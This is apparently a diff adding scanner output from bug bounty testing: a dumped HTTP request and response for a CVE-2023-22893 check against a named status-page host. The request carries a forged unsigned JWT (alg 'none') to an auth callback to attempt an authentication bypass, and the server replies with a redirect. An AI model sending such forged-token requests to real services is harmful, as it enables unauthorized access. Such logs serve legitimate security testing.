@@ -1,0 +1,42 @@
+[CVE-2023-22893] Dumped HTTP request for https://status.techsolutions.bitpanda.com/api/auth/cognito/callback?access_token=zwwntmnz&id_token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJjb2duaXRvOnVzZXJuYW1lIjoiYXhrcmZoa3V2eSIsImVtYWlsIjoie3tlbWFpbH19In0=.
+
+
+GET /api/auth/cognito/callback?access_token=zwwntmnz&id_token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJjb2duaXRvOnVzZXJuYW1lIjoiYXhrcmZoa3V2eSIsImVtYWlsIjoie3tlbWFpbH19In0=. HTTP/1.1
+Host: status.techsolutions.bitpanda.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.1
+Connection: close
+X-Bug-Bounty: Bugcrowd-eno@bugcrowdninja.com
+Accept-Encoding: gzip
+
+
+[CVE-2023-22893] Dumped HTTP response https://status.techsolutions.bitpanda.com/api/auth/cognito/callback?access_token=zwwntmnz&id_token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJjb2duaXRvOnVzZXJuYW1lIjoiYXhrcmZoa3V2eSIsImVtYWlsIjoie3tlbWFpbH19In0=.
+
+HTTP/1.1 302 Moved Temporarily
+Connection: close
+Transfer-Encoding: chunked
+Atl-Request-Id: 14425311-a10c-4830-8292-da19b939d327
+Atl-Traceid: 14425311a10c48308292da19b939d327
+Cache-Control: no-cache
+Content-Type: text/html; charset=utf-8
+Date: Tue, 05 Aug 2025 12:53:15 GMT
+Location: https://status.techsolutions.bitpanda.com
+Nel: {"failure_fraction": 0.001, "include_subdomains": true, "max_age": 600, "report_to": "endpoint-1"}
+Referrer-Policy: strict-origin-when-cross-origin
+Report-To: {"endpoints": [{"url": "https://dz8aopenkvv6s.cloudfront.net"}], "group": "endpoint-1", "include_subdomains": true, "max_age": 600}
+Server: AtlassianEdge
+Server-Timing: atl-edge;dur=136,atl-edge-internal;dur=4,atl-edge-upstream;dur=134,atl-edge-pop;desc="aws-us-east-1"
+Strict-Transport-Security: max-age=259200
+Vary: Accept,Accept-Encoding
+Via: 1.1 32c5b7040885724e78019cc31f0ef3e8.cloudfront.net (CloudFront)
+X-Amz-Cf-Id: dKCZuxn_pPQwaQCObrXNcUjPHBlGkPgnqy8lJrC6uvjhfufLUlHXJQ==
+X-Amz-Cf-Pop: IAD89-C2
+X-Cache: Miss from cloudfront
+X-Content-Type-Options: nosniff
+X-Download-Options: noopen
+X-Frame-Options: SAMEORIGIN
+X-Permitted-Cross-Domain-Policies: none
+X-Runtime: 0.058978
+X-Statuspage-Version: 286d2fa8936ee868c90b9a354eeabf8b3176da68
+X-Xss-Protection: 1; mode=block
+
+<html><body>You are being <a href="https://status.techsolutions.bitpanda.com">redirected</a>.</body></html>
